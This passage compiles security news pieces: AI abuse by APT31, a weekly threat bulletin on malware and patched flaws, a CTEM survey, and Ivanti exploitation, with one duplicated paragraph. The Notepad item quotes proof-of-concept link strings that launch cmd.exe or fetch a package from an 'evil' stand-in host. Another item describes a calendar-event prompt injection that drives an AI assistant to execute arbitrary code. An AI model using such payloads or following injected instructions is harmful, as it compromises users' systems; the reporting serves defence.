Organizations should treat third parties as extensions of their own attack surface.

"Strategic investments in supply chain threat modeling, automated dependency checks, and data flow visibility are no longer optional – they are foundational to modern security architecture," said Volkov. ®

Google: China's APT31 used Gemini to plan cyberattacks against US orgs

Meanwhile, IP-stealing 'distillation attacks' on the rise

A Chinese government hacking group that has been sanctioned for targeting America's critical infrastructure used Google's AI chatbot, Gemini, to auto-analyze vulnerabilities and plan cyberattacks against US organizations, the company says.

While there's no indication that any of these attacks were successful, "APT groups like this continue to experiment with adopting AI to support semi-autonomous offensive operations," Google Threat Intelligence Group chief analyst John Hultquist told The Register. "We anticipate that China-based actors in particular will continue to build agentic approaches for cyber offensive scale."

In the threat-intel group's most recent AI Threat Tracker report, released on Thursday and shared with The Register in advance, Google attributes this activity to APT31, a Beijing-backed crew also known as Violet Typhoon, Zirconium, and Judgment Panda.

This goon squad was one of many exploiting a series of Microsoft SharePoint bugs over the summer, and in March 2024, the US issued sanctions against and criminally charged seven APT31 members accused of breaking into computer networks, email accounts, and cloud storage belonging to numerous high-value targets.

The most recent attempts by APT31 to use Google's Gemini AI tool happened late last year, we're told.

"APT31 employed a highly structured approach by prompting Gemini with an expert cybersecurity persona to automate the analysis of vulnerabilities and generate targeted testing plans," according to the report.

The adversaries' adoption of this capability is so significant – it's the next shoe to drop

In one case, the China-based gang used Hexstrike, an open source, red-teaming tool built on the Model Context Protocol (MCP) to analyze various exploits - including remote code execution, web application firewall (WAF) bypass techniques, and SQL injection - "against specific US-based targets," the Googlers wrote.

Hexstrike enables models, including Gemini, to execute more than 150 security tools with a slew of capabilities, including network and vulnerability scanning, reconnaissance, and penetration testing. Its intended use is to help ethical hackers and bug hunters find security weaknesses and collect bug bounties – but shortly after its release in mid-August, criminals began using the AI platform for more nefarious purposes.

Moving closer to automated attacks

Integrating Hexstrike with Gemini "automated intelligence gathering to identify technological vulnerabilities and organizational defense weaknesses," the AI threat tracker says, noting that Google has since disabled accounts linked to this campaign. "This activity explicitly blurs the line between a routine security assessment query and a targeted malicious reconnaissance operation."

Google's report, which picks up where its November 2025 analysis left off, details how government-backed groups and cybercriminals alike are abusing Google's AI tools, along with the steps the Chocolate Factory has implemented to stop them. And it finds that attackers - just like everybody else on the planet - have a keen interest in agentic AI's capabilities to make their lives and jobs easier.

"The adversaries' adoption of this capability is so significant - it's the next shoe to drop," Hultquist said.

He explained there are two areas that Google is most concerned about.

"One is the ability to operate across the intrusion," he said, noting the earlier Anthropic report about Chinese cyberspies abusing its Claude Code AI tool to automate most elements of attacks directed at high-profile companies and government organizations. In "a small number of cases," they even succeeded.

"The other is automating the development of vulnerability exploitation," Hultquist said. "These are two ways where adversaries can get major advantages and move through the intrusion cycle with minimal human interference. That allows them to move faster than defenders and hit a lot of targets."

In addition, using AI agents to find vulnerabilities and test exploits widens the patch gap - the time between the bug becoming known and a full working fix being deployed and implemented.

"It's a really significant space currently," Hultquist said. "In some organizations, it takes weeks to put defenses in place."

This requires security professionals to think differently about defense, using AI to respond and fix security weaknesses more quickly than humans can on their own.

AI agents can't yet pull off fully autonomous cyberattacks – but they are already very helpful to crims

Agents gone wild! Companies give untrustworthy bots keys to the kingdom

"We are going to have to leverage the advantages of AI, and increasingly remove humans from the loop, so that we can respond at machine speed," Hultquist noted.

The latest report also found an increase in model extraction attempts - what it calls "distillation attacks" - and says both GTIG and Google DeepMind identified miscreants attempting to perform model extraction on Google's AI products. This is a type of intellectual property theft used to gain insights into a model's underlying reasoning and chain-of-thought processes.

"This is coming from threat actors throughout the globe," Hultquist said. "Your model is really valuable IP, and if you can distill the logic behind it, there's very real potential that you can replicate that technology – which is not inexpensive."

This essentially gives criminals and shady companies the ability to accelerate AI model development at a much lower cost, and Google's report cites "model stealing and capability extraction emanating from researchers and private sector companies globally." ®

Threat activity this week shows one consistent signal — attackers are leaning harder on what already works. Instead of flashy new exploits, many operations are built around quiet misuse of trusted tools, familiar workflows, and overlooked exposures that sit in plain sight.

Another shift is how access is gained versus how it’s used. Initial entry points are getting simpler, while post-compromise activity is becoming more deliberate, structured, and persistent. The objective is less about disruption and more about staying embedded long enough to extract value.

There’s also growing overlap between cybercrime, espionage tradecraft, and opportunistic intrusion. Techniques are bleeding across groups, making attribution harder and defense baselines less reliable.

Below is this week’s ThreatsDay Bulletin — a tight scan of the signals that matter, distilled into quick reads. Each item adds context to where threat pressure is building next.

Notepad RCE via Markdown Links

Microsoft Patches Notepad Flaw


      Microsoft has patched a command injection flaw (CVE-2026-20841, CVSS score: 8.8) in its Notepad app that could result in remote code execution. "Improper neutralization of special elements used in a command ('command injection') in Windows Notepad App allows an unauthorized attacker to execute code over a network," Microsoft said. An attacker could exploit this flaw by tricking a user into clicking a malicious link inside a Markdown file opened in Notepad, causing the application to run remote files. "The malicious code would execute in the security context of the user who opened the Markdown file, giving the attacker the same permissions as that user," the tech giant added. Proof-of-concept (PoC) exploits show that the vulnerability can be triggered by creating a Markdown file with "file://" links that point to executable files ("file://C:/windows/system32/cmd.exe") or contain special URIs ("ms-appinstaller://?source=https://evil/xxx.appx") to run arbitrary payloads. The issue was fixed as part of its monthly Patch Tuesday update this week. Microsoft added Markdown support to Notepad on Windows 11 last May.

APT Pressure Intensifies on Taiwan

Taiwan Becomes Target of APT Attacks


      TeamT5 said tracked more than 510 advanced persistent threat (APT) operations affecting 67 countries globally in 2025, out of which 173 attacks targeted Taiwan. "Taiwan’s role in geopolitical tensions and values in the global technology supply chain makes it uniquely vulnerable for adversaries who seek intelligence or long-term access to achieve political and military objectives," the security vendor said. "Taiwan is more than just a target – it functions as a proving ground where China-nexus APTs test and refine their tactics before scaling them to other environments."

Node.js Stealer Hits Windows

LTX Stealer Targets Windows Systems


      A new Node.js information stealer named LTX Stealer has been spotted in the wild. Targeting Windows systems and distributed via a heavily obfuscated Inno Setup installer, the malware conducts large-scale credential harvesting from Chromium-based browsers, targets cryptocurrency-related artifacts, and stages the collected data for exfiltration. "The campaign relies on a cloud-backed management infrastructure, where Supabase is used exclusively as the authentication and access-control layer for the operator panel, while Cloudflare is leveraged to front backend services and mask infrastructure details," CYFIRMA said.

Marco Stealer Expands Data Theft

Marco Stealer Emerges in the Wild


      Another new Windows-oriented information stealer is Marco Stealer, which was first observed in June 2025. Delivered via a downloader in a ZIP archive, it mainly targets browser data, cryptocurrency wallet information, files from popular cloud services like Dropbox and Google Drive, and other sensitive files stored on the victim's system. "Marco Stealer relies on encrypted strings that are decrypted only at runtime to avoid static analysis. In addition, the information stealer uses Windows APIs to detect anti-analysis tools like Wireshark, x64dbg, and Process Hacker," Zscaler ThreatLabz said. "Stolen data is encrypted using AES-256 before being sent to C2 servers via HTTP POST requests."

Telegram Sessions Hijacked via OAuth Abuse

Social Engineering Campaign Targets Telegram Accounts


      A new account takeover campaign has been observed abusing Telegram's native authentication workflows to obtain fully authorized user sessions. In one variant, victims are prompted to scan a QR code on bogus sites using the Telegram mobile application, initiating a legitimate Telegram login attempt tied to attacker-controlled API credentials. Telegram then sends an in-app authorization prompt to the victim's existing session. Alternatively, users can also enter their country code, phone number, and verification code (if enabled) on a fake web page, which causes the data to be relayed to Telegram's official authentication APIs. Upon successful verification, Telegram issues an in-app authorization request as before. "Unlike traditional phishing attacks that rely solely on credential harvesting or token replay, this campaign leverages attacker-controlled Telegram API credentials and integrates directly with Telegram's legitimate login and authorization infrastructure," CYFIRMA noted. "By inducing victims to approve in-app authorization prompts under false pretenses, the attackers achieve complete session compromise while minimizing technical anomalies and user suspicion."

Discord Expands Global Age Checks

Discord Announces Age Verification Plans


      Discord has announced it will require all users globally to verify their ages by sharing video selfies or providing government IDs to access certain content. Additionally, it will implement an age inference model, a new system that runs in the background to help determine whether an account belongs to an adult, without always requiring users to verify their age. The company has assured that video selfies don't leave a user's device, that identity documents submitted to third-party vendors, in this case k-ID, are "deleted quickly" or "immediately" after age confirmation, and that a user's age verification status cannot be seen by other users. However, concerns have been raised about whether Discord can be trusted with their most sensitive information, especially in the aftermath of a security breach of a third-party service that Discord previously relied on to verify ages in the U.K. and Australia. The incident led to the theft of government IDs of 70,000 Discord users. In a statement given to Ars Technica, k-ID said the age estimation technology runs entirely on device and no third-parties store personal data shared during age checks. The move comes at a time when laws requiring age verification on social media platforms are being adopted across the world. Discord confirmed that "a phased global rollout" would begin in "early March," at which point all users globally would be defaulted to “teen-appropriate" experiences.

GuLoader Refines Evasion Tradecraft

GuLoader Continues to Evolve


      A new analysis of the GuLoader malware has revealed that it employs polymorphic code to dynamically construct constants during execution and exception-based control flow obfuscation to conceal its functionality and evade detection. Besides introducing sophisticated exception-handling mechanisms to complicate analysis, the malware attempts to bypass reputation-based rules by hosting payloads on trusted cloud services such as Google Drive and OneDrive. First observed in December 2019, GuLoader serves primarily as a downloader for Remote Access Trojans (RATs) and information stealers.

$73.6M Pig-Butchering Scam Sentence

Man Sentenced to 20 Years in Prison for Crypto Scam


      Daren Li, 42, a dual national of China and St. Kitts and Nevis has been sentenced in absentia in the U.S. to the statutory maximum of 20 years in prison and three years of supervised release for his international cryptocurrency investment scheme known as pig butchering or romance baiting that defrauded victims of more than $73.6 million. Li pleaded guilty to his crime in November 2024. However, the defendant cut off his ankle monitor and fled the country in December 2025. His present whereabouts are unknown. "As part of his plea agreement, Li admitted that unindicted members of the conspiracy would contact victims directly through unsolicited social-media interactions, telephone calls and messages, and online dating services," the U.S. Justice Department said. "The unindicted co-conspirators would gain the trust of victims by establishing either professional or romantic relationships with them, often communicating by electronic messages sent via end-to-end encrypted applications." The co-conspirators established spoofed domains and websites that resembled legitimate cryptocurrency trading platforms and tricked victims into investing in cryptocurrency through these fraudulent platforms after gaining their trust. Li also confessed that he would direct co-conspirators to open U.S. bank accounts established on behalf of 74 shell companies and would monitor the receipt of interstate and international wire transfers of victim funds. "Li and other co-conspirators would receive victim funds in financial accounts that they controlled and then monitor the conversion of victim funds to virtual currency," the department said.

0-Click AI Prompt RCE Risk

0-Click Flaw in Claude Desktop Extensions


      A zero-click remote code execution vulnerability (CVSS score: 10.0) in Claude Desktop Extensions (DXT) could be exploited to silently compromise a system by a simple Google Calendar event when a user issues a harmless prompt like "Please check my latest events in google cal[endar] and then take care of it for me." The problem stems from how MCP-based systems like Claude DXT autonomously chain together different tools and external connectors to fulfil user requests without enforcing proper security boundaries. The phrase "take care of it" does the heavy lifting here, as the artificial intelligence (AI) assistant interprets it as a justification to execute arbitrary instructions embedded in those events without seeking users' permission. The flaw impacts more than 10,000 active users and 50 DXT extensions, according to LayerX. "Unlike traditional browser extensions, Claude Desktop Extensions run unsandboxed with full system privileges," the browser security company said. "As a result, Claude can autonomously chain low-risk connectors (e.g., Google Calendar) to high-risk local executors, without user awareness or consent. If exploited by a bad actor, even a benign prompt ('take care of it'), coupled with a maliciously worded calendar event, is sufficient to trigger arbitrary local code execution that compromises the entire system." Anthropic has opted not to fix the issue at this time. A similar Google Gemini prompt injection flaw was disclosed by Miggo Security last month.

Data-Theft Ransomware Surges

Coinbase Cartel Claims Over 60 Victims


      A nascent ransomware group called Coinbase Cartel has claimed more than 60 victims since it first emerged in September 2025. "Coinbase Cartel operations are marked by an insistence on stealing data while leaving systems available rather than complementing data theft with the use of encryptors that prohibit system access," Bitdefender said. The healthcare, technology, and transportation industries represent a major chunk of Coinbase Cartel's greatest victim demographic to date. The healthcare organizations impacted by the threat actor are primarily based in the U.A.E. Some of the other prominent groups that are focused on only data theft are World Leaks and PEAR (Pure Extraction and Ransom). The development paints a picture of an ever-evolving ransomware landscape populated by new and old actors, even as the threat is getting increasingly professionalized as attackers streamline operations. According to data from Cyble, 6,604 ransomware attacks were recorded in 2025, up 52% from the 4,346 attacks claimed by ransomware groups in 2024.

Google Expands Privacy Takedowns

Google Adds New Options "Results about you" 


      Google has expanded its "Results about you" tool to give users more control over sensitive personal information and added a way to request removal of non-consensual explicit images from search results, as well as other details like driver's license numbers, passport numbers, and Social Security numbers. "We understand that removing existing content is only part of the solution," Google said. "For added protection, the new process allows you to opt in to safeguards that will proactively filter out any additional explicit results that might appear in similar searches."

Monitoring Tools Used for Ransomware

Crazy Ransomware Gang Abuses Net Monitor and SimpleHelp 


      Threat actors have been observed leveraging Net Monitor, a commercial workforce monitoring tool, with SimpleHelp, a legitimate remote monitoring and management (RMM) platform, as part of attacks designed to deploy Crazy ransomware. The two incidents, believed to be the work of the same threat actor, took place in January and February 2026. Net Monitor comes with various capabilities that go beyond employee productivity tracking, including reverse shell connections, remote desktop control, file management, and the ability to customize service and process names during installation. These features, coupled with SimpleHelp's remote access functionality, make them attractive tools for attackers looking to blend into enterprise environments without deploying traditional malware. What's more, Net Monitor for Employees Professional bundles a pseudo-terminal ("winpty-agent.exe") that facilitates full command execution. Bad actors have been found to leverage this aspect to conduct reconnaissance, deliver additional payloads, and deploy secondary remote access channels, turning it into a functional remote access trojan. "In the cases observed, threat actors used these two tools together, using Net Monitor for Employees as a primary remote access channel and SimpleHelp as a redundant persistence layer, ultimately leading to the attempted deployment of Crazy ransomware," Huntress said.

0APT Victim Claims Questioned

0APT's 200 Victim Count Likely a Hoax


      A threat actor called 0APT appears to be falsely claiming that it has breached over 200 victims within a span of a week since launching their data leak site on January 28, 2026. Further analysis has determined that the victims are a blend of wholly fabricated generic company names and recognizable organizations that threat actors have not breached, GuidePoint's Research and Intelligence Team said. The data leak site went offline on February 8, 2026, before resurfacing the next day with a list of more than 15 very large multinational organizations. "0APT is likely operating in this deceptive manner in order to support extortion of uninformed victims, re-extortion of historical victims from other groups, defrauding of potential affiliates, or to garner interest in a nascent RaaS group," security researcher Jason Baker noted. While signs suggest that the group may be bluffing about its victim count, the Windows and Linux ransomware samples have been found to be fully operational, per Halcyon. It's worth pointing out that ransomware groups like RansomedVC have listed fabricated attacks on their data leak sites to deceive victims. Viewed in that light, 0APT's exaggerated claims are likely an attempt to gain visibility and momentum among its peers. Its origins remain unknown.

A threat actor called 0APT appears to be falsely claiming that it has breached over 200 victims within a span of a week since launching their data leak site on January 28, 2026. Further analysis has determined that the victims are a blend of wholly fabricated generic company names and recognizable organizations that threat actors have not breached, GuidePoint's Research and Intelligence Team said. The data leak site went offline on February 8, 2026, before resurfacing the next day with a list of more than 15 very large multinational organizations.

SYSTEM RCE via Named Pipe

Flaw in Quest Desktop Authority Detailed


      A high-risk security vulnerability (CVE-2025-67813, CVSS score: 5.3) within Quest Desktop Authority could allow attackers to execute remote code with SYSTEM privileges. "Quest KACE Desktop Authority exposes a named pipe (ScriptLogic_Server_NamedPipe_9300) running as SYSTEM that accepts connections from any authenticated domain user over the network," NetSPI said. The named pipe implements a custom IPC protocol that supports dangerous operations, including arbitrary command execution, DLL injection, credential retrieval, and COM object invocation. Any authenticated user on the network can achieve remote code execution as a local administrator on hosts running the Desktop Authority agent.

AI Traffic Scans to Block VPNs

Russia to Analyze Internet Traffic Using AI to Flag VPN Usage


      Russia's internet watchdog will use artificial intelligence (AI) technology to analyze internet traffic and restrict the operation of VPN services, Forbes Russia reported. The Roskomnadzor is expected to spend close to $30 million to develop the internet traffic filtering mechanism this year. The Russian government has blocked access to tens of VPN apps in recent years. It also maintains a registry of banned websites.

Mispadu Expands Banking Attacks

Mexico and Brazil Targeted by Mispadu Trojan


      Cofense said it has observed Mispadu campaigns targeting Latin America, particularly Mexico and Brazil, and to a lesser extent in Spain, Italy, and Portugal, with phishing emails containing HTML Application (HTA) attachments that are designed to bypass Secure Email Gateways (SEGs) to reach the inboxes of employees across the world. "The only variation is that sometimes the URL delivering the HTA files is embedded in an attached, password-protected PDF rather than embedded in the email itself," Cofense said. "In all recent campaigns, Mispadu makes use of an AutoIT loader and various legitimate files to run the malicious content. Each step of the delivery chain from the attached PDF to the AutoIT script is dynamically generated. This means that every hash except for the AutoIT compiler is unique to each install, further frustrating EDR." Recent iterations of the banking trojan come with the ability to self-propagate on infected hosts via email and expand the target online banking websites to include banks outside of Latin America as well as cryptocurrency-based exchanges.

ScreenConnect Deployed via Phish

Phishing Campaign Delivers ConnectWise ScreenConnect for Remote Access


      In a phishing campaign documented by Forcepoint, spoofed emails have been found to deliver a malicious .cmd attachment that escalates privileges, disables Windows SmartScreen, removes the mark-of-the-web (MotW) to bypass security warnings, and ultimately installs ConnectWise ScreenConnect. The campaign has targeted organizations across the U.S., Canada, the U.K., and Northern Ireland, focusing on sectors with high-value data, including government, healthcare, and logistics companies. Recent phishing attacks have also abused web services from Amazon, like Simple Storage Service (S3) buckets, Amazon Simple Email Service (SES), and Amazon Web Services (AWS) Amplify to slip past email security controls and launch credential phishing attacks. Other phishing attacks have embraced uncommon techniques like using edited versions of legitimate business emails to deliver convincingly spoofed emails to recipients. "These emails work by having the threat actor create an account on a legitimate service and input arbitrary text into a field that will later be included in outgoing emails," Cofense said. "After this is done, the threat actor would need to receive a legitimate email that happens to include the malicious text that was created by the threat actor. Once the email is received, the threat actor can then redirect the email to the intended victims."

CrashFix Delivers SystemBC

CrashFix Variant Attack Delivers Python Implants and SystemBC 


      A variant of the ClickFix attack called CrashFix has been used to deliver malicious payloads consistent with a known malware called SystemBC. Unlike the CrashFix-style social engineering flow documented by Huntress and Microsoft, the attack stands out because it did not involve the use of a malicious browser extension. "Instead, the victim was convinced to execute a command via the Windows Run dialog (Win+R) as seen with traditional ClickFix," Binary Defense said. "This command abused a legitimate Windows binary -- finger.exe -- copied from System32, renamed, and executed from a user-writable directory. The output of this execution was piped directly into cmd.exe, acting as a delivery mechanism for an obfuscated PowerShell payload." The PowerShell code then retrieves follow-on content, including Python backdoors and a DLL implant that overlaps with SystemBC, from attacker-controlled infrastructure, while taking steps to fingerprint the host and clean up artifacts on disk. "The coexistence of Python backdoors and a reflective DLL implant highlights a deliberate defense-evasion and persistence strategy," the company said. "By mixing scripting-based and native implants, the attacker reduced reliance on any single execution method, making complete eviction more difficult."

Bing Ads Funnel Tech Scams

Fake Bing Ads Leak to Tech Support Scams


      Malicious ads served on Bing search results when searching for sites like Amazon are being used to redirect unsuspecting users to tech support scam links hosted in Azure Blob Storage. The campaign targeted healthcare, manufacturing, and technology sectors in the U.S. "Clicking on the malicious ad sent the victims to highswit[.]space, a newly registered domain hosting an empty WordPress site, which then redirected them to one of the Azure Blob Storage containers, which served a typical tech support scam site," Netskope Threat Labs said.

Chinese VPN Infra Footprint Expands

Chinese VPN Used by Devices in Russia, China, Myanmar, Iran, and Venezuela


      A Chinese virtual private network (VPN) provider named LVCHA VPN has been used by devices in Russia, China, Myanmar, Iran, and Venezuela. It also has an Android app that's directly hosted on its website ("lvcha[.]in") and distributed via the Google Play Store. Further analysis of the domain has uncovered a cluster of nearly 50 suspicious domains, all of which promote the same VPN. "Whenever we see campaigns promoting suspicious downloads or products using so many domains, it can indicate that the operator is rotating domains to work around country-level firewalls in regions where they’re trying to promote distribution," Silent Push said.

Grid Attack Triggers Western Alerts

U.K. and U.S. Issues Warning After Poland Energy Grid Cyber Attack


      Following a late December 2025 coordinated cyber attack on Poland's power grid, the U.S. Cybersecurity and Infrastructure Security Agency (CISA) has published a bulletin for critical infrastructure owners and operators. CISA said vulnerable edge devices remain a prime target for threat actors, OT devices without firmware verification can be permanently damaged, and threat actors leverage default credentials to pivot onto the HMI and RTUs. "Operators should prioritize updates that allow firmware verification when available," the agency added. "Operators should immediately change default passwords and establish requirements for integrators or OT suppliers to enforce password changes in the future." In a similar development, Jonathan Ellison, director for national resilience at the National Cyber Security Centre (NCSC), has urged critical infrastructure operators in the country to act now and have incident response plans or playbooks in place to respond to such threats. "Although attacks can still happen, strong resilience and recovery plans reduce both the chances of an attack succeeding and the impact if one does," Ellison said.

Telnet Traffic Abruptly Collapses

Global Telnet Traffic Dropped in Mid-January 2026 


      Threat intelligence firm GreyNoise said it observed a steep decline in global Telnet traffic on January 14, 2026, six days before a security advisory for CVE-2026-24061 went public on January 20. CVE-2026-24061 relates to a critical vulnerability in the GNU InetUtils telnet daemon that could result in an authentication bypass. Data gathered by GreyNoise shows that the hourly volume of Telnet sessions dropped 65% on January 14 at 21:00 UTC, then fell 83% within two hours. Daily sessions have declined from an average of 914,000 (from December 1, 2025, to January 14, 2026) to around 373,000, equating to a 59% reduction that has persisted as of February 10, 2026. "Eighteen ASNs with significant pre-drop telnet volume (>50K sessions each) went to absolute zero after January 15," the company said. "Five entire countries vanished from GreyNoise telnet data: Zimbabwe, Ukraine, Canada, Poland, and Egypt. Not reduced to zero." Among the 18 ASNs included were British Telecom, Charter/Spectrum, Cox Communications, and Vultr. Although correlation does not imply causation, GreyNoise has raised the possibility that the telecom operators likely received advance warning about CVE-2026-24061, allowing them to act on it at the infrastructure level. "A backbone or transit provider — possibly responding to a coordinated request, possibly acting on their own assessment — implemented port 23 filtering [to block telnet traffic] on transit links," it said.

New Loaders Fuel Stealer Campaigns

New RenEngine and Foxveil Malware Loaders Spotted 


      Cyderes and Cato Networks have detailed new previously undocumented malware loaders dubbed RenEngine Loader and Foxveil that have been used to deliver next-stage payloads. The Foxveil malware campaign has been active since August 2025. It's engineered to establish an initial foothold, complicate analysis efforts, and retrieve next-stage shellcode payloads from threat actor-controlled staging hosted on trusted platforms like Cloudflare Pages, Netlify, and Discord. Attacks leveraging RenEngine Loader, on the other hand, have employed illegally modified game installers distributed via piracy platforms to deliver the malware alongside the playable content. More than 400,000 global victims are estimated to have been impacted, with most of them located in India, the U.S., and Brazil. The activity has been operational since April 2025. "RenEngine Loader decrypts, stages, and transfers execution to Hijack Loader, enabling rapid tooling evolution and flexible capability deployment," Cyderes said. "By embedding a modular, stealth-focused second-stage loader inside a legitimate Ren’Py launcher, the attackers closely mimic normal application behavior, significantly reducing early detection." The end goal of the attack is to deploy an information stealer called ACR Stealer.

Looker RCE Chain Disclosed

Flaws in Google Looker 


      Two novel security vulnerabilities have been disclosed in Google Looker that could be exploited by an attacker to fully compromise a Looker instance. This includes a remote code execution (RCE) chain via Git hook overrides and an authorization bypass flaw via internal database connection abuse. Successful exploitation of the flaws could allow an attacker to run arbitrary code on the Looker server, potentially leading to cross-tenant access, as well as exfiltrate the full internal MySQL database via error-based SQL injection, according to Tenable. "The vulnerabilities allowed users with developer permissions in Looker to access both the underlying system hosting Looker, and its internal database," Google said. Collectively tracked as CVE-2025-12743, aka LookOut (CVSS score: 6.5), they were patched by Google in September 2025. While the fixes have been applied to cloud instances, users of self-hosted Looker instances are advised to update to the latest supported version.

Trojanized 7-Zip Spreads Proxyware

Malicious 7-Zip Site Distributes Fake Installer with Proxy 


      A fake installer for the 7-Zip file archiver tool downloaded from 7zip[.]com (the legitimate domain is 7-zip[.]org) is being used to drop a proxy component that enrolls the infected host into a residential proxy node. This allows third parties to route traffic through the victim's IP address while concealing their own origins. The installer is digitally signed with a now-revoked certificate originally issued to Jozeal Network Technology Co., Limited. The campaign has been codenamed upStage Proxy by security researcher Luke Acha, who discovered it late last month. "The operators behind 7zip[.]com distributed a trojanized installer via a lookalike domain, delivering a functional copy of 7-Zip File Manager alongside a concealed malware payload," Malwarebytes said. The 7-Zip lure appears to be part of a broader effort that uses trojanized installers for HolaVPN, TikTok, WhatsApp, and Wire VPN. Attack chains involve using YouTube tutorials as a malware distribution vector to direct unsuspecting users to the bogus site, once again highlighting the abuse of trusted platforms.

AI-Built VoidLink Expands Reach

More Details About VoidLink Emerge


VoidLink is a sophisticated Linux-based command-and-control (C2) framework capable of long-term intrusion across cloud and enterprise environments. First documented by Check Point last month, ongoing analyses of the malware have revealed that it may have been developed by a Chinese-speaking developer using an artificial intelligence (AI) model with limited human review. Ontinue, in a report published this week, said it found "strong indicators" that the implant was built using a large language model (LLM) coding agent. "It fingerprints cloud environments across AWS, GCP, Azure, Alibaba Cloud, and Tencent Cloud, harvesting credentials from environment variables, config directories, and instance metadata APIs," security researcher Rhys Downing said. "It detects container runtimes and includes plugins for container escape and Kubernetes privilege escalation. A kernel-level rootkit adapts its stealth approach based on the host's kernel version." Cisco Talos said it has observed the modular framework in campaigns undertaken by a new threat actor codenamed UAT-9921, which is believed to have been active since 2019. The cybersecurity company said it also found "clear indications" of a Windows equivalent of VoidLink that comes with the ability to load plugins. "UAT-9921 uses compromised hosts to install VoidLink command and control (C2), which are then used to launch scanning activities both internal and external to the network," Talos researchers said.

Taken together, these developments show how threat actors are balancing speed with patience — moving fast where defenses are weak, and slowing down where stealth matters more than impact. The result is activity that blends into normal operations until damage is already underway.

For defenders, the challenge isn’t just blocking entry anymore. It’s recognizing misuse of legitimate access, spotting abnormal behavior inside trusted systems, and closing gaps that don’t look dangerous on the surface.

The briefs that follow aren’t isolated incidents. They’re fragments of a wider operating picture — one that keeps evolving week after week.

[2] The Hacker News - The CTEM Divide: Why 84% of Security Programs Are Falling Behind
────────────────────────────────────────────────────────────────────────────────

[TAM METİN - 668 kelime]
A new 2026 market intelligence study of 128 enterprise security decision-makers (available here) reveals a stark divide forming between organizations – one that has nothing to do with budget size or industry and everything to do with a single framework decision. Organizations implementing Continuous Threat Exposure Management (CTEM) demonstrate 50% better attack surface visibility, 23-point higher solution adoption, and superior threat awareness across every measured dimension. The 16% who've implemented it are pulling away. The 84% who haven't are falling behind.

The Demographics of the Divide

The research surveyed a senior cohort: 85% of respondents are Manager-level or above, representing organizations where 66% employ 5,000+ people across finance, healthcare, and retail sectors.

If you aren’t familiar, CTEM involves shifting from "patch everything reactively" to "continuously discover, validate, and prioritize risk exposures that can actually hurt the business." It's widely discussed in cybersecurity now as a next-generation evolution of exposure/risk management, and the new report reinforces Gartner’s view that businesses adopting it will consistently demonstrate stronger security outcomes than those that don’t.

Awareness Is High. Adoption Is Rare.

One surprising finding: There doesn’t seem to be a problem with awareness, just implementation. 87% of security leaders recognize the importance of CTEM, but only 16% have translated that awareness into operational reality. So, if they've heard of it, why aren't they using it?

The gap between awareness and implementation reveals modern security's central dilemma: which priority wins? Security leaders understand the CTEM conceptually but struggle to sell its benefits in the face of organizational inertia, competing priorities, and budget constraints that force impossible tradeoffs. The challenge of gaining management buy-in is one reason why we prepared this report: to provide the statistics that make the business case impossible to ignore.

Complexity is the New Multiplier

For example: Beyond a certain threshold, manual tracking of all the additional integrations, scripts, and dependencies breaks down, ownership blurs, and blind spots multiply. The research makes it clear that attack surface complexity is not just a management challenge; it's a direct risk multiplier.

We can see this clearly in the graph below. Attack rates rise linearly from 5% (0-10 domains) to 18% (51-100 domains), then rise steeply past 100 domains.

This sudden increase is driven by the ‘visibility gap’, the gulf between the assets a company is responsible for monitoring and those it’s aware of. Each additional domain can add dozens of connected assets, and when the count climbs past 100, this can translate to thousands of additional scripts: each one a possible attack vector. Traditional snapshot security cannot hope to log and monitor them all. Only CTEM-driven programs can provide the oversight to continuously identify and validate the dark assets hiding in this visibility gap – before attackers do.

Security leaders are currently facing a 'perfect storm' of demands. At a time when 91% of CISOs report an increase in third-party incidents, average breach costs have climbed to $4.44M, and PCI DSS 4.0.1 brings stricter monitoring and the ever-present specter of penalties. With this in mind, the report shows that attack surface management has become an issue for the boardroom as much as the server room, and the C-suite reader can only conclude that continuing to trust manual oversight and periodic controls to manage such a complex, high-stakes challenge would be self-destructive.

One of the clearest signals in this research comes from the peer benchmarking data. When organizations compare themselves side by side – by attack surface size, visibility, tooling, and outcomes – a pattern emerges that is difficult to ignore: beyond a certain level of complexity, traditional security approaches stop scaling.

The takeaway from the peer benchmarks is clear: below a certain level of exposure, organizations can rely on periodic controls and manual oversight. Above it, those models no longer hold. For security leaders operating in high-complexity environments, the question is no longer whether CTEM is valuable – it is whether their current approach can realistically keep up without it.

A significant chunk of the exploitation attempts targeting a newly disclosed security flaw in Ivanti Endpoint Manager Mobile (EPMM) can be traced back to a single IP address on bulletproof hosting infrastructure offered by PROSPERO.

Threat intelligence firm GreyNoise said it recorded 417 exploitation sessions from 8 unique source IP addresses between February 1 and 9, 2026. An estimated 346 exploitation sessions have originated from 193.24.123[.]42, accounting for 83% of all attempts.

The malicious activity is designed to exploit CVE-2026-1281 (CVSS scores: 9.8), one of the two critical security vulnerabilities in EPMM, along with CVE-2026-1340 that could be exploited by an attacker to achieve unauthenticated remote code execution. Late last month, Ivanti acknowledged it's aware of a "very limited number of customers" who were impacted following the zero-day exploitation of the issues.

Since then, multiple European agencies, including the Netherlands' Dutch Data Protection Authority (AP), Council for the Judiciary, the European Commission, and Finland's Valtori, have disclosed that they were targeted by unknown threat actors using the vulnerabilities.

Further analysis has revealed that the same host has been simultaneously exploiting three other CVEs across unrelated software -

CVE-2026-21962 (Oracle WebLogic) - 2,902 sessions

CVE-2026-24061 (GNU InetUtils telnetd) - 497 sessions

CVE-2025-24799 (GLPI) - 200 sessions

"The IP rotates through 300+ unique user agent strings spanning Chrome, Firefox, Safari, and multiple operating system variants," GreyNoise said. "This fingerprint diversity, combined with concurrent exploitation of four unrelated software products, is consistent with automated tooling."

It's worth noting that PROSPERO is assessed to be linked to another autonomous system called Proton66, which has a history of distributing desktop and Android malware like GootLoader, Matanbuchus, SpyNote, Coper (aka Octo), and SocGholish.

GreyNoise also pointed out that 85% of the exploitation sessions beaconed home via the domain name system (DNS) to confirm "this target is exploitable" without deploying any malware or exfiltrating data.

The disclosure comes days after Defused Cyber reported a "sleeper shell" campaign that deployed a dormant in-memory Java class loader to compromised EPMM instances at the path "/mifs/403.jsp." The cybersecurity company said the activity is indicative of initial access broker tradecraft, where threat actors establish a foothold to sell or hand off access later for financial gain.

"That pattern is significant," it noted. "OAST [out-of-band application security testing] callbacks indicate the campaign is cataloging which targets are vulnerable rather than deploying payloads immediately. This is consistent with initial access operations that verify exploitability first and deploy follow-on tooling later."

Ivanti EPMM users are recommended to apply the patches, audit internet-facing Mobile Device Management (MDM) infrastructure, review DNS logs for OAST-pattern callbacks, and monitor for the /mifs/403.jsp path on EPMM instances, and block PROSPERO's autonomous system (AS200593) at the network perimeter level.

